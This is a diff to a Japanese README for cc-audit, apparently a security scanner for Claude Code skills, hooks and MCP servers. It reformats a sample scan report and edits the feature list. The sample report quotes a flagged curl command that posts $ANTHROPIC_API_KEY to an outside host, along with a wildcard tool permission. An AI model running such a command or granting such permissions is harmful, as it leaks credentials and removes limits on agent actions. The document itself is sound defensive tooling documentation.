@@ -85,22 +85,28 @@ cc-audit --init ./
 ## 出力例
 
 ```
-cc-audit v3.0.0 - Claude Code Security Auditor
-
 Scanning: ./awesome-skill/
 
-[CRITICAL] EX-001: Network request with environment variable
-  Location: scripts/setup.sh:42
-  Code: curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"
+scripts/setup.sh:42:1: [ERROR] [CRITICAL] EX-001: Network request with environment variable
+     |
+  42 | curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"
+     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+     = why: Potential data exfiltration: network request with environment variable detected
+     = ref: CWE-200, CWE-319
+     = fix: Remove or encrypt sensitive data before transmission
 
-[HIGH] OP-001: Wildcard tool permission
-  Location: SKILL.md (frontmatter)
-  Issue: allowed-tools: *
+SKILL.md:3:1: [ERROR] [HIGH] OP-001: Wildcard tool permission
+     |
+   3 | allowed-tools: *
+     | ^^^^^^^^^^^^^^^^
+     = why: Overly permissive tool access detected
+     = ref: CWE-250
+     = fix: Specify explicit tool permissions instead of wildcard
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Risk Score: 60/100 [██████░░░░] HIGH
 
-Summary: 1 critical, 1 high, 0 medium, 0 low
+Summary: 2 errors, 0 warnings (1 critical, 1 high, 0 medium, 0 low)
 Result: FAIL (exit code 1)
 ```
 
@@ -116,7 +122,7 @@ Result: FAIL (exit code 1)
 
 ## 主な機能
 
-- **210以上の検出ルール** — データ流出、権限昇格、永続化、プロンプトインジェクションなど
+- **100以上の検出ルール** — データ流出、権限昇格、永続化、プロンプトインジェクションなど
 - **複数のスキャンタイプ** — Skills、Hooks、MCPサーバー、コマンド、Docker、依存関係、サブエージェント、プラグイン
 - **マルチクライアントサポート** — Claude、Cursor、Windsurf、VS Code設定を自動検出・スキャン
 - **リモートリポジトリスキャン** — GitHubリポジトリを直接スキャン（awesome-claude-codeエコシステム含む）
@@ -127,7 +133,7 @@ Result: FAIL (exit code 1)
 - **自動修正** — 特定の問題を自動的に修正
 - **複数の出力フォーマット** — Terminal、JSON、SARIF、HTML、Markdown
 - **セキュリティバッジ** — プロジェクト用のshields.ioバッジを生成
-- **SBOM生成** — CycloneDXおよびSPDXフォーマットをサポート
+- **SBOM生成** — CycloneDXフォーマットをサポート
 - **プロキシモード** — 透過プロキシによるMCPランタイム監視
 - **ウォッチモード** — 開発中のリアルタイムスキャン
 - **CI/CD 対応** — GitHub Security 統合用の SARIF 出力
